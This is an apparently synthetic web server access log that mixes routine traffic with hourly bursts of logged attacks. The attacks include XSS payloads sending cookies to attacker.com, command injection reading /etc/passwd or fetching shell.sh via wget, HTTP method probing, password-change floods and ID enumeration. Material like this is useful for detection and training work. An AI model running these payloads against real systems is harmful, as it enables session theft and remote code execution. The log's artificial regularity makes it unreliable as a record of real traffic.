195.23.11.8 - - [01/Jun/2025:17:21:49 +0000] "POST /sitemap.xml HTTP/1.1" 200 3463 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:17:24:13 +0000] "GET /static/css/main.css HTTP/1.1" 200 5392 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:17:25:47 +0000] "GET /robots.txt HTTP/1.1" 200 1127 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.152.3.77 - - [01/Jun/2025:17:27:23 +0000] "GET /sitemap.xml HTTP/1.1" 200 990 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:17:27:33 +0000] "POST /robots.txt HTTP/1.1" 304 2238 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:17:33:43 +0000] "GET /static/css/main.css HTTP/1.1" 200 12698 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:17:49:55 +0000] "POST /blog HTTP/1.1" 404 6930 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:17:53:21 +0000] "GET /robots.txt HTTP/1.1" 404 13203 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:17:59:56 +0000] "GET /blog HTTP/1.1" 200 11556 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:18:09:54 +0000] "GET /blog/post-1 HTTP/1.1" 200 4145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:18:10:04 +0000] "POST /contact HTTP/1.1" 200 1705 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:18:12:34 +0000] "POST / HTTP/1.1" 200 7505 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:18:29:38 +0000] "GET / HTTP/1.1" 304 9899 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:18:30:50 +0000] "POST / HTTP/1.1" 200 6602 "-" "Mozilla/5.0 (X11; Linux x86_64)"
188.37.240.1 - - [01/Jun/2025:18:33:35 +0000] "GET /blog HTTP/1.1" 304 3560 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:18:37:00 +0000] "POST /blog/post-1 HTTP/1.1" 200 7305 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:18:39:29 +0000] "GET /static/js/app.js HTTP/1.1" 200 5651 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:18:45:08 +0000] "GET /products HTTP/1.1" 304 4207 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:18:46:03 +0000] "POST /blog HTTP/1.1" 200 10210 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:18:49:09 +0000] "GET /favicon.ico HTTP/1.1" 200 13901 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:18:52:07 +0000] "POST /products HTTP/1.1" 404 10488 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:18:54:24 +0000] "GET /about HTTP/1.1" 200 8028 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:18:54:57 +0000] "GET /contact HTTP/1.1" 304 14673 "-" "Wget/1.21"
45.61.186.22 - - [01/Jun/2025:19:00:00 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 200 1732 "-" "curl/7.68.0"
45.61.186.22 - - [01/Jun/2025:19:00:19 +0000] "GET /search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> HTTP/1.1" 500 1611 "-" "curl/7.68.0"
45.61.186.22 - - [01/Jun/2025:19:00:36 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 500 694 "-" "curl/7.68.0"
45.61.186.22 - - [01/Jun/2025:19:00:48 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 500 590 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:19:20:51 +0000] "GET /blog/post-1 HTTP/1.1" 200 8915 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:19:25:40 +0000] "GET /products/1 HTTP/1.1" 200 9347 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:19:34:17 +0000] "GET /sitemap.xml HTTP/1.1" 200 12784 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:19:34:18 +0000] "GET /static/css/main.css HTTP/1.1" 200 12564 "-" "Mozilla/5.0 (X11; Linux x86_64)"
188.37.240.1 - - [01/Jun/2025:19:38:05 +0000] "GET /blog HTTP/1.1" 200 7946 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.152.3.77 - - [01/Jun/2025:19:43:31 +0000] "GET /blog HTTP/1.1" 200 9058 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:19:44:24 +0000] "GET /products HTTP/1.1" 200 13160 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:19:49:08 +0000] "POST /blog HTTP/1.1" 200 11763 "-" "Wget/1.21"
198.235.24.130 - - [01/Jun/2025:20:00:00 +0000] "GET /search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> HTTP/1.1" 500 180 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:00 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 536 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:13 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 200 1574 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:24 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 500 1233 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:00:42 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 200 1407 "-" "curl/7.68.0"
198.235.24.130 - - [01/Jun/2025:20:00:46 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 500 1711 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:20:01:10 +0000] "GET / HTTP/1.1" 200 7224 "-" "Wget/1.21"
185.156.73.54 - - [01/Jun/2025:20:01:18 +0000] "GET /search?q=test|id HTTP/1.1" 200 1385 "-" "curl/7.68.0"
185.156.73.54 - - [01/Jun/2025:20:01:28 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 500 501 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:20:05:13 +0000] "GET /products/1 HTTP/1.1" 200 4152 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:20:07:00 +0000] "GET /favicon.ico HTTP/1.1" 200 7092 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:20:10:31 +0000] "GET /about HTTP/1.1" 200 5206 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:20:17:06 +0000] "POST /about HTTP/1.1" 200 6689 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:20:20:10 +0000] "POST /about HTTP/1.1" 200 9250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:20:28:47 +0000] "GET /static/js/app.js HTTP/1.1" 304 6844 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:20:29:13 +0000] "POST / HTTP/1.1" 200 665 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:20:29:44 +0000] "GET /products HTTP/1.1" 200 9575 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:20:36:04 +0000] "GET /about HTTP/1.1" 304 9855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:20:36:29 +0000] "POST / HTTP/1.1" 200 945 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:20:41:26 +0000] "GET /index.html HTTP/1.1" 404 4731 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:20:42:09 +0000] "GET /about HTTP/1.1" 200 11193 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:20:50:10 +0000] "GET /products/1 HTTP/1.1" 304 8414 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:20:56:09 +0000] "GET /robots.txt HTTP/1.1" 200 10822 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:20:56:13 +0000] "GET /blog HTTP/1.1" 200 10068 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:20:57:12 +0000] "GET /sitemap.xml HTTP/1.1" 304 7941 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:20:58:02 +0000] "GET /blog/post-1 HTTP/1.1" 200 11224 "-" "curl/7.68.0"
89.207.132.170 - - [01/Jun/2025:21:00:00 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 1343 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:00 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 200 755 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:00 +0000] "DELETE /users/1 HTTP/1.1" 200 105 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:07 +0000] "DELETE /admin HTTP/1.1" 405 526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:00:15 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 200 392 "-" "curl/7.68.0"
89.207.132.170 - - [01/Jun/2025:21:00:18 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 500 721 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:18 +0000] "CONNECT /login HTTP/1.1" 403 771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:28 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 200 1748 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:30 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 1035 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:35 +0000] "DELETE /config HTTP/1.1" 403 884 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:39 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 500 1725 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:42 +0000] "TRACE /admin HTTP/1.1" 403 668 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:44 +0000] "PATCH /dashboard HTTP/1.1" 403 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:51 +0000] "TRACK / HTTP/1.1" 200 608 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:01:04 +0000] "GET /search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> HTTP/1.1" 200 1556 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:12 +0000] "TRACE /index.html HTTP/1.1" 200 607 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:01:17 +0000] "PUT /users/1 HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:01:21 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 1806 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:28 +0000] "PUT /static/app.js HTTP/1.1" 200 865 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.152.3.77 - - [01/Jun/2025:21:12:05 +0000] "GET /products HTTP/1.1" 200 9711 "-" "Mozilla/5.0 (X11; Linux x86_64)"
193.136.5.20 - - [01/Jun/2025:21:12:24 +0000] "GET /static/js/app.js HTTP/1.1" 200 5641 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:21:16:48 +0000] "POST /sitemap.xml HTTP/1.1" 200 14451 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:21:19:35 +0000] "POST /robots.txt HTTP/1.1" 200 8067 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:21:43:58 +0000] "GET /static/js/app.js HTTP/1.1" 200 984 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:54:46 +0000] "GET /contact HTTP/1.1" 200 7611 "-" "curl/7.68.0"
194.147.78.155 - - [01/Jun/2025:22:00:00 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 200 1106 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:00 +0000] "PUT /static/app.js HTTP/1.1" 200 127 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 100 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 142 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:04 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 127 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:05 +0000] "DELETE /config HTTP/1.1" 200 315 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:06 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 185 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:06 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 87 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.147.78.155 - - [01/Jun/2025:22:00:10 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 500 428 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:22:00:12 +0000] "POST /products HTTP/1.1" 200 689 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 111 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 88 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:24 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 184 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:35 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 145 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:38 +0000] "TRACE /admin HTTP/1.1" 403 199 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:57 +0000] "PATCH /dashboard HTTP/1.1" 200 511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:00:58 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 200 1611 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:01:12 +0000] "TRACK / HTTP/1.1" 403 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:17 +0000] "DELETE /users/1 HTTP/1.1" 405 534 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:18 +0000] "CONNECT /login HTTP/1.1" 403 348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:30 +0000] "PUT /users/1 HTTP/1.1" 405 915 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:22:02:49 +0000] "POST / HTTP/1.1" 200 688 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:22:06:08 +0000] "POST /sitemap.xml HTTP/1.1" 304 3738 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:22:09:50 +0000] "GET /blog HTTP/1.1" 200 10368 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:22:12:14 +0000] "GET /robots.txt HTTP/1.1" 304 345 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:22:12:41 +0000] "POST /robots.txt HTTP/1.1" 200 9627 "-" "curl/7.68.0"
85.241.12.44 - - [01/Jun/2025:22:17:38 +0000] "GET /sitemap.xml HTTP/1.1" 404 10920 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:22:25:24 +0000] "GET /favicon.ico HTTP/1.1" 200 344 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:22:28:43 +0000] "GET /favicon.ico HTTP/1.1" 200 14686 "-" "python-requests/2.28.0"
85.241.12.44 - - [01/Jun/2025:22:31:11 +0000] "GET /favicon.ico HTTP/1.1" 304 9575 "-" "python-requests/2.28.0"
2.80.17.99 - - [01/Jun/2025:22:34:53 +0000] "GET /static/js/app.js HTTP/1.1" 200 1471 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:22:57:23 +0000] "POST /static/js/app.js HTTP/1.1" 200 12453 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.108.56.181 - - [01/Jun/2025:23:00:00 +0000] "DELETE /users/1 HTTP/1.1" 200 663 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 118 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:01 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 135 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 125 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:02 +0000] "GET /api/projects/1 HTTP/1.1" 404 64 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:03 +0000] "GET /api/projects/3 HTTP/1.1" 404 70 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:04 +0000] "GET /api/projects/2 HTTP/1.1" 404 119 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:04 +0000] "GET /api/projects/4 HTTP/1.1" 404 52 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:05 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 107 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:07 +0000] "GET /api/projects/7 HTTP/1.1" 404 42 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 140 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 112 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:09 +0000] "GET /api/projects/9 HTTP/1.1" 404 50 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:12 +0000] "PUT /static/app.js HTTP/1.1" 200 914 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 97 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:12 +0000] "GET /api/projects/6 HTTP/1.1" 404 80 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:13 +0000] "GET /api/projects/13 HTTP/1.1" 404 14 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:15 +0000] "DELETE /admin HTTP/1.1" 403 787 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:15 +0000] "GET /api/projects/5 HTTP/1.1" 404 106 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:16 +0000] "GET /api/projects/8 HTTP/1.1" 404 20 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:18 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 184 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:00:21 +0000] "CONNECT /login HTTP/1.1" 403 351 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:24 +0000] "GET /api/projects/12 HTTP/1.1" 404 116 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:28 +0000] "DELETE /config HTTP/1.1" 403 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:28 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 98 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:30 +0000] "GET /api/projects/10 HTTP/1.1" 404 143 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:33 +0000] "GET /api/projects/11 HTTP/1.1" 404 80 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:35 +0000] "PUT /users/1 HTTP/1.1" 405 674 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:35 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 153 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:39 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 91 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:45 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 158 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:48 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 110 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:50 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 94 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:55 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 137 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.108.56.181 - - [01/Jun/2025:23:01:20 +0000] "TRACK / HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.108.56.181 - - [01/Jun/2025:23:01:48 +0000] "PATCH /dashboard HTTP/1.1" 200 348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.108.56.181 - - [01/Jun/2025:23:01:52 +0000] "TRACE /index.html HTTP/1.1" 403 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:23:09:01 +0000] "POST /products HTTP/1.1" 200 9343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:23:26:47 +0000] "GET /about HTTP/1.1" 200 5592 "-" "Mozilla/5.0 (X11; Linux x86_64)"
2.80.17.99 - - [01/Jun/2025:23:30:39 +0000] "POST /about HTTP/1.1" 200 8548 "-" "python-requests/2.28.0"
2.80.17.99 - - [01/Jun/2025:23:32:22 +0000] "GET /contact HTTP/1.1" 200 8128 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:23:39:27 +0000] "GET /static/js/app.js HTTP/1.1" 200 2330 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:23:40:59 +0000] "GET /products/1 HTTP/1.1" 200 6350 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:23:45:21 +0000] "GET /static/css/main.css HTTP/1.1" 404 11663 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:23:50:29 +0000] "GET /about HTTP/1.1" 200 2622 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:23:53:09 +0000] "GET /contact HTTP/1.1" 200 13502 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 162 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 96 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:02 +0000] "POST /api/auth/register HTTP/1.1" 409 95 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:03 +0000] "GET /api/tasks/1 HTTP/1.1" 404 64 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:04 +0000] "GET /api/tasks/2 HTTP/1.1" 404 104 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:05 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 172 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:05 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 140 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:06 +0000] "POST /api/auth/register HTTP/1.1" 400 84 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 167 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:07 +0000] "GET /api/tasks/7 HTTP/1.1" 404 60 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:08 +0000] "GET /api/tasks/4 HTTP/1.1" 404 144 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:08 +0000] "GET /api/tasks/8 HTTP/1.1" 404 97 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:08 +0000] "POST /api/auth/register HTTP/1.1" 400 85 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:09 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 162 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:09 +0000] "GET /api/tasks/3 HTTP/1.1" 404 132 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 180 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:14 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 150 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:14 +0000] "POST /api/auth/register HTTP/1.1" 409 137 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:14 +0000] "POST /api/auth/register HTTP/1.1" 400 196 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:15 +0000] "GET /api/tasks/5 HTTP/1.1" 404 147 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:15 +0000] "POST /api/auth/register HTTP/1.1" 409 95 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 105 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 146 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:16 +0000] "POST /api/auth/register HTTP/1.1" 409 170 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:18 +0000] "GET /api/tasks/6 HTTP/1.1" 404 91 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 189 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:27 +0000] "GET /api/tasks/9 HTTP/1.1" 404 28 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:27 +0000] "POST /api/auth/register HTTP/1.1" 409 95 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:30 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 186 "-" "Mozilla/5.0 (X11; Linux x86_64)"
